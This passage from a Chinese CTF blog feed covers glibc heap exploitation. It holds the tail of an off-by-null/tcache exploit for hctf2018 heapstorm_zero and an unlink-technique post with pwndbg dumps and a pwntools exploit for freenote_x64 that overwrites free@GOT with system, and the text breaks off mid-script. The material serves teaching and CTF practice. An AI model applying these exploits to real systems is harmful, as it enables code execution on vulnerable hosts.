1</span></span><br><span class="line"><span class="comment"># 因为 chunk 是 tcache 的第一项， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free 0 填充 tcache</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放 chunk 9 ，触发堆合并，形成 overlap chunk</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把剩下的 tcache 里面的 bin 消耗掉</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">8</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配一个chunk 此时 索引 1 的 chunk 指向 unsorted bin , leak</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'8'</span>)</span><br><span class="line"></span><br><span class="line">leak = puts(<span class="number">1</span>)</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x70</span></span><br><span class="line">info(<span class="string">"libc.address : "</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 chunk 8, 此时 索引为 9， 现在 索引 1， 9 指向同一个 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache 中为两个 一样的 chunk 链在了一起, 设这个 chunk 的名称为 A。</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0xe42ee</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 tcache中的第一个 A ，此时 A 还位于 tcache, 然后修改 A-&gt;fd 为 free_hook</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># 再次分配到 A</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 free_hook, 然后修改 free_hook 为 system</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发 free_hook</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>参考<br><a href="https://www.cnblogs.com/hac425/p/9993716.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9993716.html</a><br><a href="https://github.com/veritas501/hctf2018/blob/master/pwn-heapstorm_zero/exp.py" target="_blank" rel="noopener">https://github.com/veritas501/hctf2018/blob/master/pwn-heapstorm_zero/exp.py</a><br><a href="https://xz.aliyun.com/t/3253#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;off by null 是一个比较有意思的技术 下面通过 hctf2018 的 heapstrom_zero 实战一波。&lt;/p&gt;
&lt;p&gt;题目
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>unlink</title>
    <link href="https://nocbtm.github.io/2020/02/27/unlink/"/>
    <id>https://nocbtm.github.io/2020/02/27/unlink/</id>
    <published>2020-02-27T06:38:52.000Z</published>
    <updated>2020-04-08T14:04:21.111Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>unlink是在smallbin被释放的时候的一种操作，是将当前物理内存相邻的free chunk进行合并,简单的讲就是我们在free一个smallchunk的时候，如果它前面或者后面的chunk有空闲的，即in_use位为0时，就将前面或后面的chunk连在一起合成一个chunk;<br>smallbin的数据结构：prev_size,size,fd,bk;<br>因为smallbin被释放后是用双链串在一起的，这就使目前unlink操作时，有一定的检查机制，主要检查我们的双链是否是合法的；<br>主要检查fd,bk等指针：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);</span><br></pre></td></tr></table></figure></p><p>在双向链表中，所以有两个地方记录chunk的大小，所以检查一下其大小是否一致：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);</span><br></pre></td></tr></table></figure><p>unlink操作的简要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD)</span></span><br><span class="line">&#123;</span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span>(FD-&gt;bk != P || BK-&gt;fd !=p)</span><br><span class="line">    &#123;</span><br><span class="line">        malloc_printerr (check_action, <span class="string">"corrupted d..."</span>, P);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>实际上，我们还是有办法绕过unlink的检查，不过需要有一些条件：</p><ol><li>有一个指向heap内的指针；</li><li>存放这个指针的地址已知(一般这个地址(&amp;p)是全局变量)；</li><li>可以对这个指针进行多次写入；</li><li>然后我们想办法修改p的fd和p的bk分别为:</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位</span></span><br><span class="line">p-&gt;fd = &amp;p - <span class="number">0x18</span>; <span class="comment">//fd</span></span><br><span class="line">p-&gt;bk = &amp;p - <span class="number">0x10</span>; <span class="comment">//bk</span></span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">p-&gt;fd = &amp;p - <span class="number">12</span>; <span class="comment">//fd</span></span><br><span class="line">p-&gt;bk = &amp;p - <span class="number">8</span>; <span class="comment">//bk</span></span><br></pre></td></tr></table></figure><p>这样我们就可以绕过(FD-&gt;bk != P || BK-&gt;fd !=p)检测了，当unlink的操作完了之后，我们得到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位</span></span><br><span class="line">p = &amp;p - <span class="number">0x18</span>；</span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">p = &amp;p - <span class="number">12</span>;</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>我们以JarvisOJ中的freenote_x64来具体演示一下绕过unlink的操作并且熟悉一下smallbin的结构；<br>这道题在add函数和edit函数中，真实malloc的size最小都是0x80，也就是我们申请的是smallbin,所以操作的也是samllbin；<br>主要漏洞在delete note里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+Ch] [bp-4h]@2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( chunk_list-&gt;number &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No posts yet."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Post number: "</span>);</span><br><span class="line">    i = get_num();</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="number">0</span> &amp;&amp; i &lt; chunk_list-&gt;sum )        <span class="comment">// 未检查inuse位，double_free</span></span><br><span class="line">    &#123;</span><br><span class="line">      --chunk_list-&gt;number;</span><br><span class="line">      chunk_list-&gt;block[i].in_use = <span class="number">0L</span>L;</span><br><span class="line">      chunk_list-&gt;block[i].len = <span class="number">0L</span>L;</span><br><span class="line">      <span class="built_in">free</span>(chunk_list-&gt;block[i].ptr);           <span class="comment">// 指针未清空</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Done."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid number!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个有用的漏洞就是add和edit时，我们输入的字符串没有‘\x00’结尾符，我们输入多大的size就读多少size的字符，没有多余；</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>所以基本思路就是我们先申请4个chunk，然后free(0)和free(2)，防止合并；然后在申请2个chunk，只写入8字节，就可以leak出heap和libc的基地址;<br>在heap基地址偏移0x30的地方有我们需要的&amp;p:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603000</span><br><span class="line">0x603000:0x0000000000000000 0x0000000000001821</span><br><span class="line">0x603010:0x0000000000000100 0x0000000000000004</span><br><span class="line">0x603020:0x0000000000000001 0x0000000000000004</span><br><span class="line">0x603030:&amp;p0x0000000000604830 p 0x0000000000000001</span><br><span class="line">0x603040:0x0000000000000002 0x00000000006048c0</span><br><span class="line">0x603050:0x0000000000000001 0x0000000000000001</span><br><span class="line">0x603060:0x0000000000604950 0x0000000000000001</span><br><span class="line">0x603070:0x0000000000000004 0x00000000006049e0</span><br><span class="line">0x603080:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603090:0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure></p><p>有了&amp;p之后我们就可以构造chunk，然后unlink了；<br>unlink之后的&amp;p,此时p=&amp;p-0x18:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603000</span><br><span class="line">0x603000:0x0000000000000000 0x0000000000001821</span><br><span class="line">0x603010:0x0000000000000100 0x0000000000000004</span><br><span class="line">0x603020:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603030:0x0000000000603018 p 0x0000000000000001 //p=&amp;p-0x18</span><br><span class="line">0x603040:0x0000000000000008 0x00000000006048c0</span><br><span class="line">0x603050:0x0000000000000001 0x0000000000000001</span><br><span class="line">0x603060:0x0000000000604950 0x0000000000000001</span><br><span class="line">0x603070:0x0000000000000004 0x00000000006049e0</span><br><span class="line">0x603080:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603090:0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>然后现在我们就可以修改0x0603018地址开始的内容了，然后就可以修改指针达到任意地址写入了；</p><h3 id="具体思路"><a href="#具体思路" class="headerlink" title="具体思路"></a>具体思路</h3><p>伪造的如下三个堆块结构 ，注意chunk前后的size一定要相对应<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80xg 0x17b8820</span><br><span class="line">0x17b8820:0x00000000000000000x0000000000000191</span><br><span class="line">0x17b8830:0x00000000000000900x0000000000000081</span><br><span class="line">0x17b8840:0x00000000017b70180x00000000017b7020</span><br><span class="line">0x17b8850:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8860:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8870:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8880:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8890:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b88a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b88b0:0x00000000000000800x0000000000000090</span><br><span class="line">0x17b88c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88d0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8900:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8910:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8920:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8930:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8940:0x00000000000000900x0000000000000121</span><br><span class="line">0x17b8950:0x32323232323232320x00007f61721feb78</span><br><span class="line">0x17b8960:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8970:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8980:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8990:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89b0:0x63636363636363630x0000000000020651</span><br><span class="line">0x17b89c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89d0:0x00000000000001200x0000000000000090</span><br><span class="line">0x17b89e0:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b89f0:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a00:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a10:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a20:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a30:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a40:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a50:0x64646464646464640x6464646464646464</span><br></pre></td></tr></table></figure></p><p>free(1)之后，堆块的结构<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80xg 0x11dd820</span><br><span class="line">0x11dd820:0x00000000000000000x0000000000000191</span><br><span class="line">0x11dd830:0x00000000000000900x0000000000000111</span><br><span class="line">0x11dd840:0x00007fc6bdb86b780x00007fc6bdb86b78</span><br><span class="line">0x11dd850:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd860:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd870:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd880:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd890:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd8a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd8b0:0x00000000000000800x0000000000000090</span><br><span class="line">0x11dd8c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8d0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd900:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd910:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd920:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd930:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd940:0x00000000000001100x0000000000000120</span><br><span class="line">0x11dd950:0x32323232323232320x00007fc6bdb86b78</span><br><span class="line">0x11dd960:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd970:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd980:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd990:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9b0:0x63636363636363630x0000000000020651</span><br><span class="line">0x11dd9c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9d0:0x00000000000001200x0000000000000090</span><br><span class="line">0x11dd9e0:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dd9f0:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda00:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda10:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda20:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda30:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda40:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda50:0x64646464646464640x6464646464646464</span><br></pre></td></tr></table></figure></p><p>而目标地址已经被修改为 p=&amp;p-0x18<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40xg 0x11dc000</span><br><span class="line">0x11dc000:0x00000000000000000x0000000000001821</span><br><span class="line">0x11dc010:0x00000000000001000x0000000000000000</span><br><span class="line">0x11dc020:0x00000000000000010x0000000000000120</span><br><span class="line">0x11dc030:0x00000000011dc0180x0000000000000000  //p=&amp;p-0x18</span><br><span class="line">0x11dc040:0x00000000000000000x00000000011dd8c0</span><br><span class="line">0x11dc050:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc060:0x00000000011dd9500x0000000000000000</span><br><span class="line">0x11dc070:0x00000000000000000x00000000011dd9e0</span><br><span class="line">0x11dc080:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc090:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc100:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc110:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc120:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc130:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>接下来向 chunk0 里面写内容就相当于控制了chunk list，随便修改东西，这里把free_got覆盖为system</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./freenote_x64'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29050</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./freenote_x64'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">List</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Length of new note: '</span>)</span><br><span class="line">p.sendline(str(len(cont)))</span><br><span class="line">p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">p.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'Length of note: '</span>)</span><br><span class="line">p.sendline(str(len(cont)))</span><br><span class="line">p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">p.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">new(<span class="string">'a'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'b'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'c'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'d'</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="string">'11111111'</span>)</span><br><span class="line">new(<span class="string">'22222222'</span>)</span><br><span class="line">List()</span><br><span class="line">p.recvuntil(<span class="string">'11111111'</span>)</span><br><span class="line">s=p.recvuntil(<span class="string">'\x0a'</span>)</span><br><span class="line">chunk2=u64(s[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_addr=chunk2<span class="number">-0x1940</span></span><br><span class="line">point_chunk0=heap_addr+<span class="number">0x30</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">payload = p64(<span class="number">0x90</span>)+p64(<span class="number">0x81</span>)+p64(point_chunk0<span class="number">-0x18</span>)+p64(point_chunk0<span class="number">-0x10</span>) </span><br><span class="line">payload +=<span class="string">'a'</span>*<span class="number">0x60</span></span><br><span class="line">payload += p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">payload +=<span class="string">'c'</span>*<span class="number">0x80</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x121</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#free_got-&gt;system</span></span><br><span class="line">free_got_addr=e.got[<span class="string">'free'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(free_got_addr)</span><br><span class="line">payload2=p64(<span class="number">4</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(free_got_addr)</span><br><span 